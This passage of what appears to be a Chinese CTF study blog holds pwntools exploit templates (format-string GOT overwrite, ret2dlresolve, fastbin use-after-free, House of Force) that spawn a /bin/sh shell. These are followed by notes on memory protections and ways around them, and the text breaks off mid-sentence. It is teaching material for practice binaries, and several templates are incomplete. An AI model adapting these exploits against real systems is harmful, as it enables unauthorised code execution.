class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2><span id=\"fmt\">FMT</span></h2><p>（利用pwntools的fmt module实现自动化修改got）</p>\n<h3><span id=\"32bit\">32bit</span></h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./&#x27;</span>)</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算偏移量</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exec_fmt</span>(<span class=\"params\">payload</span>):</span></span><br><span class=\"line\">    r.sendline(payload)</span><br><span class=\"line\">    info = r.recv()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> info</span><br><span class=\"line\">  </span><br><span class=\"line\">auto = FmtStr(exec_fmt)</span><br><span class=\"line\">offset = auto.offset</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获得 func 的 got 地址</span></span><br><span class=\"line\">func_got = elf.got[<span class=\"string\">&#x27;func&#x27;</span>]<span class=\"comment\">#func通常是一些例如printf或puts的函数</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;func_got =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(func_got)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获得 func 的真实地址</span></span><br><span class=\"line\">payload = p32(func_got) + <span class=\"string\">&#x27;%&#123;&#125;$s&#x27;</span>.<span class=\"built_in\">format</span>(offset)</span><br><span class=\"line\">r.send(payload)</span><br><span class=\"line\">func_addr = u32(r.recv()[<span class=\"number\">4</span>:<span class=\"number\">8</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;func_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(func_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获得 system 的真实地址</span></span><br><span class=\"line\">system_addr = func_addr - (libc.symbols[<span class=\"string\">&#x27;func&#x27;</span>] - libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(system_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = fmtstr_payload(offset, &#123;func_got : system_addr&#125;)</span><br><span class=\"line\">r.send(payload)</span><br><span class=\"line\">r.send(<span class=\"string\">&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2><span id=\"ret2dl\">ret2dl</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> roputils <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> process</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> gdb</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> context</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./baby_pwn&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./baby_pwn&#x27;</span>)</span><br><span class=\"line\">offset = <span class=\"number\">44</span></span><br><span class=\"line\">bss_base = rop.section(<span class=\"string\">&#x27;.bss&#x27;</span>)</span><br><span class=\"line\">buf = rop.fill(offset)</span><br><span class=\"line\"></span><br><span class=\"line\">buf += rop.call(<span class=\"string\">&#x27;read&#x27;</span>, <span class=\"number\">0</span>, bss_base, <span class=\"number\">100</span>)</span><br><span class=\"line\"><span class=\"comment\">## used to call dl_runtimeresolve()</span></span><br><span class=\"line\">buf += rop.dl_resolve_call(bss_base + <span class=\"number\">20</span>, bss_base)</span><br><span class=\"line\">r.send(buf)</span><br><span class=\"line\"></span><br><span class=\"line\">buf = rop.string(<span class=\"string\">&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">buf += rop.fill(<span class=\"number\">20</span>, buf)</span><br><span class=\"line\"><span class=\"comment\">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class=\"line\">buf += rop.dl_resolve_data(bss_base + <span class=\"number\">20</span>, <span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">buf += rop.fill(<span class=\"number\">100</span>, buf)</span><br><span class=\"line\">r.send(buf)</span><br><span class=\"line\">r.interactive()</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.binary = elf = ELF(<span class=\"string\">&quot;./baby_pwn&quot;</span>)</span><br><span class=\"line\">rop = ROP(context.binary)</span><br><span class=\"line\">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class=\"string\">&quot;system&quot;</span>,args=[<span class=\"string\">&quot;/bin/sh&quot;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">rop.ret2dlresolve(dlresolve)</span><br><span class=\"line\">raw_rop = rop.chain()</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./baby_pwn&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = flat(&#123;<span class=\"number\">44</span>:raw_rop,<span class=\"number\">256</span>:dlresolve.payload&#125;)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h1><span id=\"heap\">Heap</span></h1><h2><span id=\"fastbin_attack_uaf\">fastbin_attack_uaf</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">if args[&#x27;REMOTE&#x27;]:</span></span><br><span class=\"line\"><span class=\"string\">    p = remote(&quot;&quot;)</span></span><br><span class=\"line\"><span class=\"string\">else:</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">p = process([<span class=\"string\">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/32/lib/libc.so.6&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cmd</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size,content</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">1</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Note size :&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Content :&quot;</span>)</span><br><span class=\"line\">    p.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">2</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Index :&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">put</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">3</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Index :&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;aabb&quot;</span>)<span class=\"comment\">#chunk0 [chunk0_print(0x10),chunk0_content(0x20)]</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;aabb&quot;</span>)<span class=\"comment\">#chunk1 [chunk0_print(0x10),chunk0_content(0x20)]</span></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">main_arena =&gt; chunk0_print(0x10) =&gt; chunk0_content(0x20)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">fastbin:</span></span><br><span class=\"line\"><span class=\"string\">main_arena =&gt; chunk1_print(0x10) =&gt; chunk0_print(0x10) </span></span><br><span class=\"line\"><span class=\"string\">main_arena =&gt; chunk1_content(0x20) =&gt; chunk0_content(0x20)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,p32(magic))<span class=\"comment\">#chunk2, with 0x10 puts_field and 0x8 content field ,the memory space is poniter to chunk1_print and chunk0_print </span></span><br><span class=\"line\">put(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2><span id=\"house-of-force\">House of Force</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&quot;/glibc/2.19/32/lib/ld-2.19.so&quot;</span>,<span class=\"string\">&quot;./&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.19/32/lib/libc-2.19.so&quot;</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./&#x27;)</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./&#x27;</span>)</span><br><span class=\"line\">top_chunk_addr = </span><br><span class=\"line\">malloc_hook_addr = </span><br><span class=\"line\"></span><br><span class=\"line\">atoi_got_addr = elf.got[<span class=\"string\">&#x27;atoi&#x27;</span>]</span><br><span class=\"line\">free_got_addr = elf.got[<span class=\"string\">&#x27;free&#x27;</span>]</span><br><span class=\"line\">printf_plt_addr = elf.plt[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cmd</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;option---&gt;&gt;&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size,content</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">1</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Input the length of the note content:&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Input the content:&quot;</span>)</span><br><span class=\"line\">    p.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>(<span class=\"params\">idx,content</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">3</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Input the id:&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Input the new content:&quot;</span>)</span><br><span class=\"line\">    p.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">4</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Input the id:&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sync</span>():</span></span><br><span class=\"line\">    cmd(<span class=\"number\">5</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exit</span>():</span></span><br><span class=\"line\">    cmd(<span class=\"number\">6</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil()</span><br><span class=\"line\">p.sendline()</span><br><span class=\"line\">p.recvuntil()</span><br><span class=\"line\">heap_base = u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;heap_base: &#x27;</span> + <span class=\"built_in\">hex</span>(heap_base))</span><br><span class=\"line\">p.recvuntil()</span><br><span class=\"line\">p.sendlineafter()</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">p.sendlineafter(, p32(<span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">offset = heap_base - malloc_hook_addr - <span class=\"number\">0xd0</span> + <span class=\"number\">0x8</span></span><br><span class=\"line\">add(offset,<span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\">#chunk0,change top chunk ptr</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = atoi_addr - libc.symbols[<span class=\"string\">&#x27;atoi&#x27;</span>]</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,p32(system_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["Generalization"]},{"title":"基础知识","url":"/2022/10/22/sum_%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>这是一些也许很基础但是一直没有搞透彻or忘了or巩固的一些知识点的集合，空的就是还没有来得及填，</p>\n<h2><span id=\"编程语言\">编程语言</span></h2><h4><span id=\"c\">c</span></h4><h4><span id=\"python\">python</span></h4><h4><span id=\"汇编\">汇编</span></h4><p>首先就是寻址的几种方式：</p>\n<h3><span id=\"1寻址\">1）寻址</span></h3><h5><span id=\"1直接寻址\">1/直接寻址</span></h5><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov     rax, fs:28h #直接寻址，fs段寄存器+偏移量。这里其实是一个canary的值。</span><br></pre></td></tr></table></figure>\n<h5><span id=\"2间接寻址\">2/间接寻址</span></h5><p>间接在使用指针以及解引用的形式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov     [rbp+var_8], rax # 寄存器相对寻址。相当于把rax，也就是这个canary值放到rbp+var_8的地方。</span><br></pre></td></tr></table></figure>\n<h5><span id=\"3比例寻址\">3/比例寻址</span></h5><p>例如在数组遍历中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.data</span><br><span class=\"line\">arrayD 1,2,3,4</span><br><span class=\"line\">.code</span><br><span class=\"line\">mov esi,3</span><br><span class=\"line\">mov eax,arrayD[esi*4]\t\t\t\t\t;eax = 4  </span><br></pre></td></tr></table></figure>\n<p>其中，比例因子“4”代表数组的元素个数，esi的值代表下标。</p>\n<h2><span id=\"2段寄存器\">2）段寄存器</span></h2><p>其实就是段的基址，起寻址索引作用。例子就比如</p>\n<p><code>mov rax fs：28h</code></p>\n<p>然后是一些常见的寄存器含义。</p>\n<p>最后是一些容易忘，但是一定要记住的指令。</p>\n<h2><span id=\"二进制栈漏洞利用\">二进制栈漏洞利用</span></h2><h3><span id=\"保护机制\">保护机制</span></h3><p>由于面向的是底层原理，所以在这个part，每一个机制都将围绕以下几个部分阐述：</p>\n<ol>\n<li>源码层面的原理</li>\n<li>动态分析中的具体行为</li>\n<li>利用的方式</li>\n</ol>\n<h4><span id=\"aslramppie\">aslr&amp;pie</span></h4><h5><span id=\"原理amp行为\">原理&amp;行为</span></h5><p>一些参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0 - 表示关闭进程地址空间随机化。</span><br><span class=\"line\">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class=\"line\">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure>\n<p><code>ASLR</code>对libc段，栈以及堆的加载地址进行随机化，而<code>PIE</code>对代码段<code>.text</code>, 数据段<code>.*data</code>，<code>.bss</code>等固定地址进行随机化，弥补了aslr的不足。</p>\n<p>aslr的绕过原理：</p>\n<p>由于内存的页载入机制，PIE的随机化只能影响到单个内存页，也就是说地址只会以一个内存页为单位进行变化。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，<strong>某条指令的后12位，3个十六进制数的地址是始终不变的。因此我们找到目标地址的后三个十六进制数，然后想办法将返回地址（被压入的ip）后三个十六进制数覆盖成目标地址，从而达到劫持程序流程的目的</strong>。</p>\n<h5><span id=\"绕过\">绕过</span></h5><ol>\n<li>爆破</li>\n<li>泄露某个库的真实地址，利用固定偏移绕过。</li>\n</ol>\n<h4><span id=\"canary\">canary</span></h4><h5><span id=\"原理amp行为\">原理&amp;行为</span></h5><p>针对每个进程，在stack中（具体位置是<code>rbp</code>&amp;<code>ebp</code>前）插入一串以字节<code>\\x00</code>结尾（防止泄露）的随机数，长度大概是<code>qword</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov    rax, qword ptr fs:[0x28]</span><br><span class=\"line\">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>\n<p>可以看到是从<code>fs</code>寄存器0x28偏移的值中取值，然后给到<code>rbp - 8</code>的位置，然后在函数返回前将这个值与目前<code>rbp-8</code>的值异或，若为0则正常返回，否则报错。</p>\n<h6><span id=\"fs寄存器\">fs寄存器？</span></h6><p>fs寄存器指向栈的 TLS 结构：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *tcb;        <span class=\"comment\">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class=\"line\"><span class=\"comment\">                       thread descriptor used by libpthread.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">dtv_t</span> *dtv;</span><br><span class=\"line\">  <span class=\"keyword\">void</span> *self;       <span class=\"comment\">/* Pointer to the thread descriptor.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> multiple_threads;</span><br><span class=\"line\">  <span class=\"keyword\">uintptr_t</span> sysinfo;</span><br><span class=\"line\">  <span class=\"keyword\">uintptr_t</span> stack_guard; <span class=\"comment\">//fs:0x28</span></span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125; <span class=\"keyword\">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>\n<h5><span id=\"绕过\">绕过</span></h5><p>绕过思路：</p>\n<ol>\n<li>劫持<code>__stack_chk_fail</code>的got表。</li>\n<li>直接利用程序漏洞提供的内存泄露，覆盖Canary的低字节，拿到Canary的值。</li>\n<li><code>fork（）</code>产生的子进程中Canary值不变，可以利用其爆破泄露。</li>\n<li>覆盖<code>fs:0x28</code>指向的<code>tls</code>结构的<code>stack_guard</code>，从源头根除Canary（bushi）。</li>\n</ol>\n<h4><span id=\"relro\">relro</span></h4><p>对dynamic linker处理过 relocation设置为只读。</p>\n<p>” Partial RELRO” ：设置got表为只读。</p>\n<p>” FULL RELRO” ：对所有重定位表项设置为只读。</p>\n<h5><span id=\"绕过\">绕过：</span></h5><p>在partial relro的情况下还是可以使用ret2dl。full relro的话似乎要找那个什么debug。。</p>\n<h4><span id=\"nx\">nx</span></h4><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>\n<p>在Windows下，类似的概念为DEP（数据执行保护）</p>\n<h5><span id=\"绕过\">绕过</span></h5><p>rop</p>\n<h4><span id=\"fortify\">FORTIFY</span></h4><p>fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。</p>\n<p>_FORTIFY_SOURCE设为1，并且将编译器设置为优化1(<em>gcc -O1</em>)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能</p>\n<p>_FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。</p>\n<p><code>gcc -D_FORTIFY_SOURCE=1</code> 仅仅只会在编译时进行检查 (特别像某些头文件 <code>#include &lt;string.h&gt;</code>)</p>\n<p><code>gcc -D_FORTIFY_SOURCE=2</code> 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)</p>\n<h5><span id=\"绕过\">绕过</span></h5><p>由于一般这个保护在编译时就已经将危险的函数优化了，所以没有什么可绕过之说。（我感觉）</p>\n<h3><span id=\"漏洞\">漏洞</span></h3><p>略，这个其实比较简单。。</p>\n<h4><span id=\"栈溢出\">栈溢出</span></h4><h4><span id=\"整数溢出\">整数溢出</span></h4><h4><span id=\"格式化字符串\">格式化字符串</span></h4><p>对于每一个 %s，printf() 都会从栈上取一个数字，把该数字视为地址，然后打印出该地址指向的内存内容，由于不可能获取的每一个数字都是地址，所以数字对应的内容可能不存在，或者这个地址是被保护的，那么便会使程序崩溃。</p>\n<h4><span id=\"数组越界\">数组越界</span></h4><h4><span id=\"rop\">ROP</span></h4><h5><span id=\"ret2dl\">ret2dl</span></h5><h5><span id=\"srop\">srop</span></h5><p>当用户向内核发起signal时，此时系统切换为内核态，并且由内核保存进程的上下文（通常是一些寄存器状态）至用户栈，然后切换回用户态，执行信号处理程序。程序执行完毕后，再次切换成内核态，将保存的寄存器状态恢复后返回用户态。</p>\n<p>​        所以这一串来回切换中，一个缺陷就是第一次切换时上下文保存于用户栈中，所以正好我们可以通过栈溢出控制栈中的数据，而且当寄存器恢复时，内核并不会检查栈中的内容是否被篡改。</p>\n<p>具体利用：可以利用<code>sys_sigreturn</code>将伪造的栈内内容恢复到寄存器上。</p>\n<h5><span id=\"ret2csu\">ret2csu</span></h5><h4><span id=\"trick\">trick</span></h4><h5><span id=\"dynelf\">DynELF</span></h5><p>​        DynELF的意义在于当我们无法找到目标libc中具体的符号偏移时，可以利用它来搜索内存中的函数地址,而不需要再通过libc来获取。</p>\n<p>搜索主要为两步：</p>\n<ol>\n<li><p>寻找elf文件加载基址：基地址内存页起始的字符串为<code>\\0x7fELF</code>，所以可以指定内存中的地址，然后对地址进行页对齐，再与当前内存页起始字符串进行对比，如果不符合则不断与更低地址内存页的起始字符串对比，直到找到。</p>\n</li>\n<li><p>寻找glibc加载基址：efl在内存中有一个叫做<code>link_map</code>的双向链表，在学习ret2dl的时候遇见过，大致是指向elf的一些表项相关数据结构的链表，其中包含了每个动态加载的库的路径和加载基址等信息。对于如何找到<code>link_map</code>    ,一般来说有两种方式，在full relro以外的elf中，可以在<code>Dynamic</code>段的<code>.got.plt</code>节中找到，对于启用full relro的elf，可以在<code>Dynamic</code>段的<code>DT_DEBUG</code>中找到。<code>Dynamic</code>段的地址则需要通过ELF文件的段表得到，由于我们已经获得了ELF的内存基地址，所以也能得到段表的地址。</p>\n</li>\n</ol>\n<h2><span id=\"二进制堆漏洞利用\">二进制堆漏洞利用</span></h2><p>略</p>\n<h4><span id=\"off-by-one\">off by one</span></h4><h4><span id=\"unlink\">unlink</span></h4><h4><span id=\"chunk-overlapping\">chunk overlapping</span></h4><h4><span id=\"house-series\">house series</span></h4><h2><span id=\"操作系统基础重要\"><strong>操作系统基础</strong>（重要）</span></h2><h3><span id=\"中断\">中断</span></h3><p>利用<code>int 0x80</code>=&gt; <code>syscall</code>来实现内核陷入。</p>\n<h3><span id=\"函数调用栈\">函数调用栈</span></h3><h4><span id=\"寄存器传参规则32amp64\">寄存器传参规则（32&amp;64）</span></h4><h4><span id=\"调用约定\">调用约定</span></h4><h5><span id=\"stdcall\">stdcall</span></h5><ul>\n<li>参数从右向左压入堆栈 </li>\n<li>函数自身修改堆栈 </li>\n<li>函数的装饰名(decoration name/mangling name)为函数名自动加前导的下划线, 后面紧跟一个@符号, 其后紧跟着参数的尺寸</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#caller</span><br><span class=\"line\">\tpush 2; 第二个参数入栈</span><br><span class=\"line\"> push 1; 第一个参数入栈</span><br><span class=\"line\"> call function; 调用函数, 注意此时自动把cs:eip入栈</span><br><span class=\"line\"> </span><br><span class=\"line\"> #callee</span><br><span class=\"line\"> push ebp; 保存ebp寄存器, 该寄存器将用来保存堆栈的栈顶指针, 可以在函数退出时恢复</span><br><span class=\"line\"> mov ebp, esp; 保存栈顶指针</span><br><span class=\"line\"> mov eax, [ebp + 8H];  堆栈中ebp指向位置之前依次保存有ebp, cs:eip, a, b, ebp +8指向a</span><br><span class=\"line\"> add eax, [ebp + 0CH]; 堆栈中ebp + 12处保存了b</span><br><span class=\"line\"> mov esp, ebp; 恢复esp</span><br><span class=\"line\"> pop ebp;</span><br><span class=\"line\"> ret 8;</span><br></pre></td></tr></table></figure>\n<h5><span id=\"cdeclc语言缺省调用约定\">cdecl（c语言缺省调用约定）</span></h5><ul>\n<li>参数从右向左压入堆栈 </li>\n<li>调用者函数修改堆栈 </li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"> #caller</span><br><span class=\"line\"> push 1;</span><br><span class=\"line\"> push 2;</span><br><span class=\"line\"> call function; // push retn ; jmp retn(esp - 8)</span><br><span class=\"line\"> add esp, 8; //注意, 这里调用者再恢复堆栈</span><br><span class=\"line\"></span><br><span class=\"line\">#callee</span><br><span class=\"line\">push ebp; 保存ebp, 该寄存器将用来保存堆栈的栈顶指针, 可以在函数退出时恢复</span><br><span class=\"line\">mov ebp, esp; 保存栈顶指针</span><br><span class=\"line\">mov eax, [ebp + 8H]; 堆栈ebp指向位置之前依次保存有ebp, cs:eip, a, b, ebp + 